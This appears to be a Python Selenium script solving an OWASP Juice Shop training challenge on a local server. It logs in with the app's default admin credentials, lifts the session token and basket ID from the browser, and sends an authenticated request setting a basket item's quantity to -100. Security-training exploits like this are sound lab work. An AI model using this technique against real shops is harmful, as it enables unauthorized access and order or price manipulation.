from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import requests
import json

def main():
    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)

    # Open the webpage
    driver.get("http://localhost:3000/#/")  # URL for the local server

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    # Log in with a valid user
    login_user(driver)

    # Capture the authorization token after login then use it to make requests
    token = acquire_token(driver)

    if token:
        print("Successfully acquired token.")

        # Get the basket ID
        basketid = acquire_basket_id(driver)

        if basketid:
            # Add product to the basket (if necessary)
            # You may need to add a product to the basket first if one isn't already there
            # add_product_to_my_cart(driver)

            # Now, find the item in the basket and update its quantity to a negative value
            update_item_quantity_to_negative(token, basketid)
        else:
            print("Failed to acquire basket ID.")
    else:
        print("Failed to capture the auth token.")

    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()

def login_user(driver):
    # login as normal user
    WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "navbarAccount"))
    ).click()

    # get to login page
    WebDriverWait(driver, 10).until (
        EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
    ).click()

    # Put in email & password
    emailField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "email"))
    )
    emailField.send_keys("admin@juice-sh.op")  # Example email

    passwordField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "password"))
    )
    passwordField.send_keys("admin123")  # Example password
    passwordField.send_keys(Keys.RETURN)  # This hits 'enter' to log in

    time.sleep(2)  # Allow login process to start

def acquire_token(driver):
    cookies = driver.get_cookies()

    for cookie in cookies:
        if cookie['name'] == 'token':
            return cookie['value']
    return None

def acquire_basket_id(driver):
    # Retrieve the basketid from sessionStorage
    basket_id = driver.execute_script("return sessionStorage.getItem('bid');")
    
    if not basket_id:
        print("Basket ID could not be found in sessionStorage.")
    else:
        print(f"Basket ID found: {basket_id}")
    
    return basket_id

def update_item_quantity_to_negative(token, basketid):
    # Get the product id (this should be the product in your basket)
    product_id = get_product_id_in_basket(basketid)
    
    if not product_id:
        print("No product found in basket.")
        return
    
    # URL to update basket item
    url = f"http://localhost:3000/api/BasketItems/{product_id}"

    # Headers for authentication
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # The payload with the negative quantity (-100)
    payload = {
        "quantity": -100  # Negative quantity to complete the achievement
    }

    # Sending PUT request to update the quantity of the product in the basket
    response = requests.put(url, json=payload, headers=headers)

    if response.status_code == 200:
        print(f"Successfully updated product quantity to negative in basket {basketid}.")
        print("Check your basket now to verify the update.")
    else:
        print(f"Failed to update item: {response.status_code}, {response.text}")

def get_product_id_in_basket(basketid):
    # You may want to retrieve the actual product ID from your basket before making the PUT request
    # For simplicity, assume the product ID is 1 (change it accordingly based on your basket)
    # You can find the product ID by looking at the basket content or network requests in your browser dev tools.
    
    product_id = 1  # Placeholder ID, change to actual product ID in your basket
    return product_id


if __name__ == "__main__":
    main()
